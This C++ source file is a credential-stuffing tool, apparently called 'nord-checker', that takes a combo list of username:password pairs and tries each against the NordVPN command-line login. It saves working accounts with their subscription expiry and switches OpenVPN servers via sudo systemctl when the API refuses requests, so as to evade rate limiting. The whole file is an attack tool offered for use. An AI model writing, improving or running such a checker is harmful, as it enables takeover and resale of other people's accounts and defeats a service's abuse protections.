#include <iostream>
#include <string>
#include<cstring>
#include <fstream>
#include <unistd.h>
#include <sys/wait.h>
#include <fcntl.h>

//#define __DEBUG
#define BUFLEN 500
#define LIMIT 500
#define STATUS_SUCCESS 0
#define STATUS_FAILURE 1
#define STATUS_API_REFUSED 2
#define TOTAL_SERVERS 20
using namespace std;

bool parseArgs(int argc, char *argv[]);
void parseCombo(const string& combo, string& username, string& password);
bool nordvpn_logout(void);
int checkStatus(int rfd);
string getExpiry(void);
bool changeAccount(int nextServerNum, int currServerNum);

int main(int argc, char* argv[])
{

	if(!parseArgs(argc, argv))
		return -1;

	ifstream ifile{argv[2]};
	if(ifile.fail() || ifile.bad())
	{
		cerr << "[ERROR]: nord-checker: Failed to Open Input file\n";
		return -1;
	}

	ofstream ofile{argv[4], std::fstream::out | std::fstream::app};
	if(ofile.fail() || ofile.bad())
	{
		cerr << "[ERROR]: nord-checker: Failed to Open Output file\n";
	}

	string combo, username, password;

	int count{1}, nextServerNum{2}, currServerNum{1};

	if(argc == 7)
	{
		int i = std::stoi(argv[6]);
		if(i >= 1)
		{
			currServerNum = i;
			nextServerNum = i+1;
		}

		if(!changeAccount(currServerNum, 0))
		{
			cerr << "Failed to Start Openvpn Server Number: " << currServerNum << '\n';
			return -1;
		}
		else
			cout << "Started Openvpn Server Number: " << currServerNum << '\n';
	}

	bool checkback{false};

	while(count <= LIMIT)
	{
		if(!checkback)
		{
			getline(ifile, combo);
			if(ifile.eof())
				break;
			parseCombo(combo, username, password);
		}
		else
			checkback = false;
	
		if(!nordvpn_logout())
		{
			cerr << "[ERROR]: Failed to logout of NordVPN\n";
			return -1;
		}
	int fds[2];
	if(pipe(fds) == -1)
	{
		perror("main: pipe");
		return -1;
	}

        pid_t rpid = fork();
        if(rpid == -1)
        {
            perror("[ERROR]: nordvpn-checker: fork");
            return -1;
        }

        if(rpid == 0)
        {
		close(fds[0]);
		if(dup2(fds[1], STDOUT_FILENO) == -1)
		{
			perror("main: dup2");
			exit(-1);
		}	
		close(fds[1]);

		int nfd = open("/dev/null", O_WRONLY);
		if(dup2(nfd, STDERR_FILENO) == -1)
		{
			perror("main: open");
			exit(-1);
		}
		close(nfd);

            	int ret = execlp("nordvpn", "nordvpn", "login", "--username", username.c_str(), "--password", password.c_str(), nullptr);
            if(ret == -1)
            {
                perror("[ERROR]: nordvpn-checker: execlp");
		exit(-1);
            }
        }

	close(fds[1]);
    
	cout << count << ": Checking:\t" << combo << flush;
        pid_t cpid = wait(nullptr);

        int status = checkStatus(fds[0]);
	close(fds[0]);

        if(status == STATUS_SUCCESS)
        {
            string expiry = getExpiry();
            ofile << combo << "\t|\tExpiry: " << expiry << endl;
            cout << "\t[SUCCESS]:" << "\tExpiry: " << expiry << '\n';
        }
        else if(status == STATUS_API_REFUSED)
        {
            cout << "\t[FAILURE]:\t[API REFUSED TO SERVE REQUEST]\n";
	    checkback = true;

	    if(nextServerNum > TOTAL_SERVERS)
		    nextServerNum = 1;

	    if(currServerNum > TOTAL_SERVERS)
		    currServerNum = 1;

	    bool ret = changeAccount(nextServerNum, currServerNum);
	    	if(!ret)
		{
			cout << "[ERROR]: Not Able to Switch NordAccount After API Ban\n";
			return -1;
		}
		else
		{
			cout << "Switched Your Openvpn Server to server Number: " << nextServerNum << '\n';
			nextServerNum++;
			currServerNum++;
			sleep(10);
		}
        }
	else
	{
		cout << "\t[FAILURE]:\tWrong Credentials OR MFA\n";
	}

        count++;
    }


    changeAccount(0, currServerNum);
    ofile.close();
    ifile.close();
    
    return 0;
}

bool parseArgs(int argc, char *argv[])
{
    if(argc != 5 && argc != 7)
    {

        cerr << "[ERROR]: nord-checker: Invalid Number of Arguments\nUsage: " << "./nordchecker -f {input_file_path} -o {output_file_path}\n";
        return false;
    }

    if(strcmp(argv[1], "-i") != 0 && strcmp(argv[1], "--input") != 0)
    {
        cerr << "[ERROR]: nord-checker: Invalid Flag: " << argv[1] << '\n';
        return false;
    }

    if(strcmp(argv[3], "-o") != 0 && strcmp(argv[3], "--output") != 0)
    {
        cerr << "[ERROR]: nord-checker: Invalid Flag: " << argv[3] << '\n';
        return false;
    }

    if(argc == 7 && strcmp(argv[5], "-c") != 0 && strcmp(argv[5], "--current") != 0)
    {
	    cerr << "[ERROR]: nordvpn-checker: Invalid Flag: " << argv[5] << '\n';
	    return false;
    }
	
    return true;

}

void parseCombo(const string& combo, string& username, string& password)
{
    size_t delimPos = combo.find(":");
    username = combo.substr(0, delimPos);
    password = combo.substr(delimPos+1, string::npos);

    #ifdef __DEBUG
        cerr << "[DEBUG]: Username: " << username << '\n';
    	size_t length = strlen(password.c_str());
        cerr << "[DEBUG]: Password: " << password << '\n';
	cerr << "[DEBUG]: Length of Password: " << length << '\n';
	cerr << "[DEBUG]: Ascii Value of Last Character in Password: " << (int)password[length-1] << '\n';
    #endif

    return ;
}

bool nordvpn_logout(void)
{
	pid_t cpid = fork();
	if(cpid == -1)
	{
		perror("nordvpn_logout: fork");
		return false;
	}
	else if(cpid == 0)
	{
		int fd = open("/dev/null", O_WRONLY);
		if(fd == -1)
		{
			perror("nordvpn_logout: open");
			exit(-1);
		}
		if(dup2(fd, STDOUT_FILENO) == -1)
		{
			perror("nordvpn_logout: dup2");
			exit(-1);
		}

		if(dup2(fd, STDERR_FILENO) == -1)
		{
			perror("nordvpn_logout: dup2");
			exit(-1);
		}

		close(fd);

		int ret = execlp("nordvpn", "nordvpn", "logout", nullptr);
		if(ret == -1)
		{
			perror("nordvpn_logout: execlp");
			exit(-1);
		}
	}

	wait(nullptr);

	return true;
}

int checkStatus(int rfd)
{
	char buffer[BUFLEN];
	ssize_t count = read(rfd, buffer, BUFLEN-1);
	buffer[count-1] = '\0';

	if(strstr(buffer, "We couldn't") || strstr(buffer, "Username or"))
		return STATUS_FAILURE;
	else if(strstr(buffer, "Welcome"))
		return STATUS_SUCCESS;
	else if(strstr(buffer, "It's"))
		return STATUS_API_REFUSED;

    return STATUS_FAILURE;
}

string getExpiry(void)
{
    string line{"Unknown"};
    int fds[2];
    if(pipe(fds) == -1)
    {
	    perror("getExpiry: pipe");
	    return line;
    }

    pid_t cpid = fork();
    if(cpid == -1)
    {
	    perror("getExpiry: fork");
	    return line;
    }
    else if(cpid == 0)
    {
	    close(fds[0]);
	    if(dup2(fds[1], STDOUT_FILENO) == -1)
	    {
		    perror("getExpiry: dup2");
		    exit(-1);
	    }
	    close(fds[1]);

	    int nfd = open("/dev/null", O_WRONLY);
	    if(dup2(nfd, STDERR_FILENO) == -1)
	    {
		    perror("getExpiry: open");
		    exit(-1);
	    }
	    close(nfd);
	    
	    int ret = execlp("nordvpn", "nordvpn", "account", nullptr);
	    if(ret == -1)
	    {
		    perror("getExpiry: execlp");
		    exit(-1);
	    }
    }
    close(fds[1]);

    pid_t rpid = wait(nullptr);

    char buffer[BUFLEN];
    ssize_t count = read(fds[0], buffer, BUFLEN-1);
    close(fds[0]);
    if(count <= 0)
    {
	    cerr << "[ERROR]: getExpiry: Failed to read from pipe\n";
	    return line;
    }
    buffer[count-1] = '\0';

	#ifdef __DEBUG
    		cerr << "\ngetExpiry: Number of Characters read: " << count << '\n';
		cerr << "getExpiry: Content Read from pipe: " << buffer << '\n'; 
	#endif

	line = buffer;
        size_t reqIndex = line.find("VPN Service:");
        if(reqIndex != string::npos)
            return line.substr(reqIndex + 12, string::npos);

    return line;
}


bool changeAccount(int nextServerNum, int currServerNum)
{
	int status;
	
	string currServerNumString;
	if(currServerNum != 0)
	{
		currServerNumString = std::to_string(currServerNum);
		pid_t cpid = fork();
		if(cpid == -1)
		{
			perror("changeAccount: fork");
			return false;
		}
		else if(cpid == 0)
		{
			int fd = open("/dev/null", O_WRONLY);
			if(dup2(fd, STDOUT_FILENO) == -1)
			{
				perror("changeAccount: dup2");
				exit(-1);
			}

			if(dup2(fd, STDERR_FILENO) == -1)
			{
				perror("changeAccount: dup2");
				exit(-1);
			}
			close(fd);
			
			int ret = execlp("sudo", "sudo", "systemctl", "disable", "--now", ("openvpn@" + currServerNumString).c_str(), nullptr);
			if(ret == -1)
			{
				perror("changeAccount: execlp");
				exit(-1);
			}
		}

		pid_t rpid = wait(&status);
		if(!WIFEXITED(status) || WEXITSTATUS(status) != 0)
			return false;
	}


	string nextServerNumString;
	if(nextServerNum != 0)
	{
		nextServerNumString = std::to_string(nextServerNum);

	pid_t cpid = fork();
	if(cpid == -1)
	{
		perror("changeAccount: fork");
		return false;
	}
	else if(cpid == 0)
	{
		int fd = open("/dev/null", O_WRONLY);
		if(fd == -1)
		{
			perror("changeAccount: open");
			exit(-1);
		}
		if(dup2(fd, STDOUT_FILENO) == -1)
		{
			perror("changeAccount: dup2");
			exit(-1);
		}

		if(dup2(fd, STDERR_FILENO) == -1)
		{
			perror("changeAccount: dup2");
			exit(-1);
		}
		close(fd);

		int ret = execlp("sudo", "sudo", "systemctl", "start", ("openvpn@" + nextServerNumString).c_str(), nullptr);
		if(ret == -1)
		{
			perror("changeAccount: execlp");
			exit(-1);
		}
	}

		wait(&status);

		if(!WIFEXITED(status) || (WEXITSTATUS(status) != 0))
			return false;

		return true;
	}

	return true;
}
